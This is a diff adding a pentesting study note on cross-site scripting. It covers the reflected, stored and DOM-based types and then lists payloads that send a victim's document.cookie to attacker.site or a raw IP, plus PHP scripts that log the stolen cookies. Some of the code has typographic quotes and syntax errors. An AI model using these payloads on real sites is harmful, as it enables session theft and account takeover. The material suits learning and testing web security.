@@ -1,0 +1,93 @@
+---
+title: XSS attack - Cross-Site Scripting
+author: amandaguglieri
+draft: false
+TableOfContents: true
+tag: pentesting, webpentesting
+---
+
+**Cross-Site Scripting** attacks or **XSS** attacks enable attackers to inject client-side scripts into web pages. This is done through an URL than the attacker sends. Crafted in the URL, this js payload is injected.
+
+## Cross-Site Scripting XSS: reflected, persistent or DOM based
+
+**Reflected attacks**: malicious payload is carried inside the request that the browser sends. You need to bypass the anti-xss filters. This way when the victim clicks on it it will be sending their information to the attacker (limited to js events).  
+
+Example:
+
+```
+http://victim.site/seach.php?find=<payload>
+```
+
+**Persistent or stored XSS attacks**: payload is sent to the web server and then stored. The most common vector for these attacks are HTML forms that submit content to the web server and then display that content back to the users (comments, user profiles, forum posts…). Basically if the url somehow stays in the server, then, every time that someone accesses to it, they will suffer the attack.
+
+**DOM based** XSS attacks: tricky one. This time the javascript file procedes from the server, and in that sense, the file is trusteable. Nevertheless, the file modifies changes in the web structure. [Quoting OWASP](https://owasp.org/www-community/attacks/DOM_Based_XSS): "DOM Based XSS (or as it is called in some texts, “type-0 XSS”) is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an unexpected manner".
+
+
+## Mitigation for cookie stealing
+
+Depending on Enabling the HTTPOnly flag.
+
+
+## Crafted payloads
+
+```html
+<script>alert(‘lala’)</script>
+
+<script>alert(document.cookie)</script>
+
+<script>
+var i = new Image();
+i.src = “http://attacker.site/log.php?q=”+document.cookie;
+</script>
+```
+
+Now, this script save the cookie in a text file on the attacker site:
+
+```php
+	<?php
+		$filename=”/tmp/log.txt”;
+		$fp=fopen($filename, ‘a’);
+		$cookie=$_GET[‘q`];
+		fwrite($fp, $cookie);
+		fclose($fp);
+	?>
+```
+
+## Example of an attack
+
+The attacker creates a get.php file and saves it into its server. 
+
+This php file will store the data that the attacker server receives into a file.
+
+This could be the content of the get.php file:
+
+```php
+<?php
+	$ip = $_SERVER(‘REMOTE_ADDR’);
+	$browser = $_SERVER(‘HTTP_USER_AGENT’);
+
+	$fp = fopen(‘jar.txt’, ‘a’);
+
+fwrite($fp, $ip . ‘ ‘ . $browser . “ \n”);
+fwrite($fp, urldecode($_SERVER[‘QUERY_STRING’]) . “ \n\n”);
+fclose($fp);
+?>
+```
+
+Now in the web server the attacker achieve to store this payload:
+
+```html
+<script>
+var i = new Image();
+i.src = “http://attacker.site/get.php?cookie=”+escape(document.cookie);
+</script>
+
+# Or in one line:
+<script>var i = new Image(); i.src = “http://10.86.74.7/moville.php?cookie=”+escape(document.cookie); </script>
+``` 
+
+## Tools and payloads
+
+- See updated chart: [Attacks and tools for web pentesting](index-attacks-tools-web-pentesting.md).
+
+
